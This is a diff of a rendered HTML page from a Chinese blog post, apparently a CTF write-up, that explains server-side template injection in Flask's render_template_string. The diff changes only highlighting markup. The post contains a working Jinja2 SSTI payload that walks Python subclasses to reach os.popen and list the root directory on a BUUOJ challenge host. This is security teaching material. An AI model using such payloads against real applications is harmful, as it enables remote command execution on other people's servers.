@@ -489,10 +489,10 @@
 
 
 <p>小学的时候拿别人的好词好句，套在我们自己的作文里，此时我们的作文就相当于模板，而别人的好词好句就相当于传递进模板的内容。</p>
-<h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># 服务端接受用户的输入，将其作为web应用模版的一部分
-# 在进行目标编译渲染的过程中，执行了用户的恶意输入，因而导致了敏感信息泄露，代码执行，Getshell等问题。
+<h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># 服务端接受用户的输入，将其作为web应用模版的一部分</span>
+<span class="token comment"># 在进行目标编译渲染的过程中，执行了用户的恶意输入，因而导致了敏感信息泄露，代码执行，Getshell等问题。</span>
 
-# 其影响范围主要取决于模版引擎的复杂性。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token comment"># 其影响范围主要取决于模版引擎的复杂性。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h4 id="模版引擎："><a href="#模版引擎：" class="headerlink" title="模版引擎："></a>模版引擎：</h4><p>在传统的网站，客户端向服务器发送请求，服务器将数据和html字符串发送给客户端 </p>
 <p>如果使用AJAX技术发送请求，那么服务器端就会返回json数据，原本数据和html的拼接是在服务器端完成的，现在在客户端完成，那么就需要使用客户端模版引擎</p>
@@ -544,7 +544,7 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
 <p>我们模版渲染的话有两个方法，render_template() 和 render_template_string()</p>
 <p>Render_template():用来渲染一个指定的额template文件夹下的一个文件</p>
 <p>render_template_string:用来渲染一个字符串</p>
- <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">return render_template_string(template), 404 # 这里指渲染了字符串<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+ <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span>, <span class="token number">404</span> <span class="token comment"># 这里指渲染了字符串</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
@@ -925,7 +925,7 @@ length <span class="token operator">=</span> <span class="token builtin">len</sp
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq11dz551cj30z80d075w.jpg" alt="image-20210429233452834"></p>
 <p>可以看到os模块的位置是117</p>
 <p>构造payload，查看目录</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">http:&#x2F;&#x2F;66798d0c-db46-4a74-b944-e90d4e896e76.node3.buuoj.cn&#x2F;qaq?name&#x3D;&#123;&#123;%27%27.__class__.__base__.__subclasses__()[117].__init__.__globals__[%27popen%27](%27dir%20&#x2F;%27).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">http://66798d0c-db46-4a74-b944-e90d4e896e76.node3.buuoj.cn/qaq?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>%27%27.__class__.__base__.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span>.__init__.__globals__<span class="token punctuation">[</span>%27popen%27<span class="token punctuation">]</span><span class="token punctuation">(</span>%27dir%20/%27<span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq11t60urfj30u003qjs1.jpg" alt="image-20210429234928426"></p>
 <p>可以看到有一个flag文件,读取</p>
